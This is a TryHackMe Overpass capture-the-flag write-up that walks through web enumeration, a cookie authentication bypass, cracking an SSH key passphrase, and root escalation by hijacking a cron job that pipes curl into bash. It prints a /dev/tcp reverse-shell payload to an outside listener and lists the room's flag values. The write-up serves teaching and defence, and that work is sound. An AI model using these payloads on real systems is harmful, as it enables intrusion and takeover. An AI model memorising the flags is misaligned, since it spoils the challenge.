---
description: A documented solve path for the Overpass room, based on recorded lab evidence.
---

# TryHackMe Overpass Write-up

## TryHackMe Overpass Write-Up

### Challenge information

* **Platform:** TryHackMe
* **Room:** Overpass
* **Room URL:** [https://tryhackme.com/room/overpass](https://tryhackme.com/room/overpass)
* **Author:** Jude Holden
* **Scope:** Authorized CTF lab environment only

> **Session IP note:** The recorded Nmap and Gobuster evidence uses `10.114.177.184`. Later SSH and reverse-shell evidence uses `10.114.167.35`. Both values are retained exactly as recorded. The supplied notes do not establish why they differ.

### Overview

This write-up documents the recorded path from web reconnaissance to root access. It preserves observed commands and output. Conclusions are separated from evidence where possible.

The chain began with SSH and HTTP exposure. Directory enumeration identified `/admin/`. Source inspection then revealed an authentication-bypass condition and an encrypted RSA private key. A recovered key passphrase and a website message linked the key to `james`.

After SSH access, local enumeration exposed a root cron job. That job downloaded and executed a script from `overpass.thm` every minute. In the controlled lab, local hostname resolution redirected that request to an attacker-controlled HTTP server. The scheduled root process executed the supplied script and returned a root shell.

### Table of contents

* [Tools used](tryhackme-overpass-write-up.md#tools-used)
* [Initial reconnaissance](tryhackme-overpass-write-up.md#initial-reconnaissance)
* [Web enumeration and authentication bypass](tryhackme-overpass-write-up.md#web-enumeration-and-authentication-bypass)
* [RSA private-key recovery](tryhackme-overpass-write-up.md#rsa-private-key-recovery)
* [SSH access as james](tryhackme-overpass-write-up.md#ssh-access-as-james)
* [Post-exploitation enumeration](tryhackme-overpass-write-up.md#post-exploitation-enumeration)
* [ROT47 discovery](tryhackme-overpass-write-up.md#rot47-discovery)
* [Root cron-job analysis](tryhackme-overpass-write-up.md#root-cron-job-analysis)
* [Controlled hostname resolution and script replacement](tryhackme-overpass-write-up.md#controlled-hostname-resolution-and-script-replacement)
* [Reverse shell and root verification](tryhackme-overpass-write-up.md#reverse-shell-and-root-verification)
* [Flag retrieval](tryhackme-overpass-write-up.md#flag-retrieval)
* [Attack chain](tryhackme-overpass-write-up.md#attack-chain)
* [Vulnerability analysis](tryhackme-overpass-write-up.md#vulnerability-analysis)
* [Defensive recommendations](tryhackme-overpass-write-up.md#defensive-recommendations)
* [Evidence integrity and limitations](tryhackme-overpass-write-up.md#evidence-integrity-and-limitations)
* [Final summary](tryhackme-overpass-write-up.md#final-summary)

### Tools used

* Nmap
* Gobuster
* SSH
* `ssh2john`
* John the Ripper
* CyberChef
* Netcat
* Python `http.server`
* Linux command-line utilities

### Initial reconnaissance

The initial scan targeted the recorded address `10.114.177.184`:

```bash
nmap -A 10.114.177.184
```

Relevant output:

```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-19 04:51 -0400
Nmap scan report for 10.114.177.184
Host is up (0.14s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Overpass

Network Distance: 3 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 31.70 seconds
```

The scan established two initial services: SSH on TCP/22 and HTTP on TCP/80. Nmap identified a Go HTTP server and the `Overpass` page title. It did not establish the full web attack surface. Web enumeration followed for that reason.

### Web enumeration and authentication bypass

Directory enumeration identifies content that is not linked from visible navigation. It can expose administrative paths, downloads, development files, and application resources.

```bash
gobuster dir -u http://10.114.177.184/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Observed Gobuster output excerpt:

```
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.114.177.184/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
# license, visit http://creativecommons.org/licenses/by-sa/3.0/ (Status: 301) [Size: 0] [--> /%23%20license,%20visit%20http:/creativecommons.org/licenses/by-sa/3.0/]
img                  (Status: 301) [Size: 0] [--> img/]
downloads            (Status: 301) [Size: 0] [--> downloads/]
aboutus              (Status: 301) [Size: 0] [--> aboutus/]
admin                (Status: 301) [Size: 42] [--> /admin/]
Progress: 321 / 220559 (0.15%)
```

The `/admin/` redirect justified closer inspection. Page-source inspection is useful because client-side logic may disclose routes, credentials, key material, or flawed authorization decisions.

#### Authentication finding

Inspection identified a cookie-based condition that could be manipulated. Using the relevant altered cookie produced an HTTP `200` response. This is evidence of an authentication-bypass finding in the authorized lab.

Cookies often carry session identifiers or state used by web applications. The server must validate that state and enforce authorization server-side. Client-controlled values must not be trusted as proof of identity.

An HTTP `200 OK` response alone does **not** prove authentication succeeded. A site may return `200` for a login page, error message, or generic content. Here, the recorded conclusion rests on the observed response together with the source-derived authentication logic. The exact authenticated content and request are not available.

Source inspection also led to recovery of an encrypted RSA private key, saved locally as `id_rsa`. The available evidence does not identify the exact resource or HTTP request that delivered the key.

#### Evidence gaps

The following details were not supplied and are intentionally not reconstructed:

* The exact cookie name, original value, modified value, and request/response pair.
* The exact source-code fragment implementing the bypass.
* The request or endpoint used to retrieve the private key.
* Any HTTP response body proving an authenticated session.

### RSA private-key recovery

The recovered key was encrypted. Its header included:

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,...
```

An encrypted SSH private key requires its passphrase before SSH can use it. That passphrase protects the private-key file at rest. It is separate from any remote Linux account password.

`ssh2john` extracts a cracking representation from the private-key format. John the Ripper consumes that representation as a password hash. It does not treat the original private-key file as an ordinary password hash directly.

```bash
ssh2john id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```

Observed result:

```
Loaded 1 password hash (SSH, RSA/DSA/EC/OPENSSH private key)
james13          (id_rsa)
1g ... DONE
Session completed.
```

The recovered **private-key passphrase** was `james13`. `rockyou.txt` is a common password wordlist. It enables dictionary guesses against weak or reused passphrases.

The `(id_rsa)` text identifies the local input filename. It does not prove a remote username. The website message established the likely account separately:

> Since you keep forgetting your password, James, I've set up SSH keys for you.
>
> If you forget the password for this, crack it yourself. I'm tired of fixing stuff for you.
>
> Also, we really need to talk about this "Military Grade" encryption. - Paradox

The message names James and explicitly connects SSH keys to him. It therefore supports `james` as the SSH username and links the recovered key to that account.

### SSH access as james

Before using a private key, restrictive permissions prevent other local users from reading it. SSH commonly refuses keys that are too broadly accessible. The `-i` option selects the identity file explicitly.

```bash
chmod 600 id_rsa
ssh -i id_rsa james@10.114.167.35
```

When prompted, the recovered private-key passphrase is entered: `james13`. The recorded result was SSH access as `james`. No SSH banner or terminal transcript was supplied.

### Post-exploitation enumeration

Local user enumeration included files in James's home directory. A to-do list provided application context:

```
To Do:
> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
> Write down my password somewhere on a sticky note so that I don't forget it.
  Wait, we make a password manager. Why don't I just use that?
> Test Overpass for macOS, it builds fine but I'm not sure it actually works
> Ask Paradox how he got the automated build script working and where the builds go.
  They're not updating on the website
```

This identifies Overpass as a password manager. It also points to a build process and signals concerns about its cryptography. Hidden files are worth checking because Unix filenames beginning with `.` are omitted from ordinary directory listings. They often store application configuration, credentials, or user state.

The hidden `.overpass` file contained:

```
,LQ?2>6QiQ$JDE6>Q\[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN.j
```

### ROT47 discovery

CyberChef identified ROT47 as the candidate transformation. ROT47 rotates printable ASCII characters in the range 33–126 by 47 positions. ROT13 only rotates alphabetic characters. ROT47 therefore affects letters, numbers, punctuation, and symbols.

CyberChef is useful for testing and decoding candidate encodings without manual transcription. Decoding ROT47 reverses an obfuscation. It does **not** decrypt cryptographically protected data, because ROT47 has no secret key and provides no meaningful confidentiality.

The supplied `.overpass` value is preserved above. Its exact plaintext is not reproduced here. The recorded string includes an escaped backslash before `[` and the notes do not supply a verified decode output. Producing a plaintext from an ambiguous transcription would be speculative.

#### Source-code clue

A comment at line 20 of `overpass.go` stated:

```go
//Secure encryption algorithm from https://socketloop.com/tutorials/golang-rotate-47-caesar-cipher-by-47-characters-example
```

Source references can reveal algorithms selected by an application. This comment corroborates the ROT47 result for `.overpass`. Calling ROT47 a secure encryption algorithm is technically incorrect. It is a reversible substitution transform with no secret and is unsuitable for passwords or confidential data.

Only this source-code comment was supplied. No claim is made about reviewing the full source or other code paths.

### Root cron-job analysis

The system-wide crontab was inspected with:

```bash
cat /etc/crontab
```

Relevant output:

```
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

This is the key privilege-escalation finding:

* `* * * * *` schedules execution every minute.
* `root` runs the command with root privileges.
* `curl overpass.thm/downloads/src/buildscript.sh` retrieves a remote shell script.
* `| bash` sends the retrieved content directly to a shell.

The command shows no integrity verification, signature validation, or pinned trusted artifact. Whether this is exploitable depends on the hostname's resolution, network path, script source, and execution context. In this authorized lab, the subsequent controlled test established that the resolution path could be influenced and the result executed as root.

This creates a trust-boundary failure. A root scheduler trusts remotely retrieved executable content without verifying its origin or integrity. It can become a remote-code-execution path when the content source is controllable.

### Controlled hostname resolution and script replacement

The test used a local hostname-resolution override. `/etc/hosts` is consulted during local name resolution and can map a hostname to a chosen IP address. The target was configured so `overpass.thm` resolved to the listener machine, `192.168.163.218`.

This controlled demonstration occurred only against the intentionally vulnerable TryHackMe machine. It is not a procedure for arbitrary external systems.

The hosted directory matched the URL path requested by cron:

```
.
└── downloads/
    └── src/
        └── buildscript.sh
```

The local `downloads/src/buildscript.sh` contained this payload:

```bash
sh -i >& /dev/tcp/192.168.163.218/9001 0>&1
```

This is the locally supplied lab payload. It is not a copy of the original challenge-host script.

The HTTP server was started from the directory root:

```bash
python3 -m http.server 80 --directory .
```

`--directory .` serves the current directory. The resulting path maps `/downloads/src/buildscript.sh` to the prepared file. Port 80 was selected because the cron command requested `overpass.thm` without an explicit port, which defaults to HTTP port 80.

Bash's `/dev/tcp/host/port` feature opens a TCP connection to the specified host and port. Here, standard input, output, and error were redirected through that connection. Receiving an HTTP request proves the target fetched the file. It does not independently prove execution. The later reverse connection and `id` output provide that execution and privilege evidence.

The cron interval was one minute, so the listener and HTTP server had to remain available until the next scheduled run. Since cron executed the pipeline as `root`, the downloaded script ran with root's privileges.

### Reverse shell and root verification

A Netcat listener waited for the payload's outbound connection:

```bash
nc -lvnp 9001
```

`-l` listens, `-v` provides verbose connection details, `-n` avoids DNS resolution, and `-p 9001` selects the listening port.

Observed output:

```
listening on [any] 9001 ...
connect to [192.168.163.218] from (UNKNOWN) [10.114.167.35] 35050
sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
```

The listener accepted the script's outbound TCP connection. The lack of a fully interactive TTY is expected for a basic reverse shell. Without a terminal device, job control is disabled.

The `#` prompt alone does not prove root access. `id` provides direct evidence: UID and GID zero confirm that the shell ran as `root`.

### Flag retrieval

The user flag was retrieved during the lab session with:

```bash
cat user.txt
```

Observed value:

```
thm{65c1aaf000506e56996822c6281e6bf7}
```

The root flag was retrieved during the lab session with:

```bash
cat root.txt
```

Observed value:

```
thm{7f336f8c359dbac18d54fdd64ea753bb}
```

No additional flag paths or retrieval commands are asserted.

### Attack chain

```mermaid
flowchart TD
    A[Port scan: SSH and HTTP] --> B[Directory enumeration]
    B --> C[/admin/ discovered]
    C --> D[Cookie-based authentication bypass]
    D --> E[Source inspection and encrypted RSA key]
    E --> F[ssh2john and John recover key passphrase]
    F --> G[SSH access as james]
    G --> H[Home-directory enumeration]
    H --> I[Root cron downloads and executes buildscript.sh]
    I --> J[Controlled overpass.thm resolution]
    J --> K[Local HTTP server supplies lab payload]
    K --> L[Reverse connection]
    L --> M[id confirms root]
```

### Vulnerability analysis

#### Observed findings

1. The application used a manipulable cookie-related authentication condition.
2. Source inspection led to an encrypted RSA private key.
3. The private key used a passphrase recoverable with the recorded wordlist attack.
4. The application used ROT47-related obfuscation, not secure cryptography.
5. A root cron job downloaded and executed a hostname-resolved remote script without recorded integrity checks.
6. In the lab, controlled hostname resolution redirected that retrieval to a local server.

#### Security lessons

Client-controlled state must never be the sole authorization control. Sensitive artifacts, including private keys, must not be exposed through web resources.

A password-protected key still depends on the strength of its passphrase. A common passphrase can defeat otherwise sound key protection.

Encoding and reversible transforms such as ROT47 are not cryptography. They cannot protect passwords or secrets.

Root-level scheduled jobs must not execute remotely fetched content without strong authenticity and integrity guarantees. Hostname resolution is part of the trust boundary. Build systems need authenticated artifact delivery, least privilege, and controlled deployment paths.

### Defensive recommendations

* Enforce authentication and authorization on the server for every privileged request.
* Do not rely on modifiable client-side cookies as proof of authorization.
* Remove private keys and sensitive artifacts from web-accessible content.
* Protect private keys with strong, unique passphrases and restrictive file permissions.
* Replace ROT47 and similar encodings with modern, vetted cryptography where confidentiality is required.
* Do not pipe downloaded content directly into a shell.
* Verify build artifacts using signatures or cryptographic hashes from a trusted channel.
* Use an authenticated, controlled build and deployment process.
* Run scheduled tasks with the minimum privileges required.
* Monitor hostname-resolution changes, scheduled-task changes, and unexpected outbound connections.

These recommendations address the observed lab findings. Their production implementation should include threat modeling and operational validation.

### Evidence integrity and limitations

* Commands and output quoted above are preserved from the supplied session evidence.
* The exact Gobuster command and relevant output were supplied and included.
* No HTTP request, cookie value, or complete authentication source code was supplied.
* No SSH session transcript was supplied.
* The original `overpass.thm` build script was not supplied. Only the locally hosted test payload is documented.
* The `.overpass` plaintext is omitted because no exact, verified decode output was supplied.
* The encrypted private key is intentionally excluded from this public write-up.
* The target and listener addresses are lab-session values, not reusable constants.
* The IP discrepancy between early web evidence and later SSH evidence remains unverified.

### Final summary

The recorded Overpass solve combined web enumeration, a cookie-based authentication bypass, source inspection, encrypted private-key passphrase recovery, and SSH access as `james`. Local enumeration then exposed a root cron job that trusted and executed a remotely retrieved build script.

A controlled hostname-resolution override in the authorized lab redirected the script retrieval to a local HTTP server. The scheduled root task executed the supplied payload. The reverse shell's `id` output verified root access.
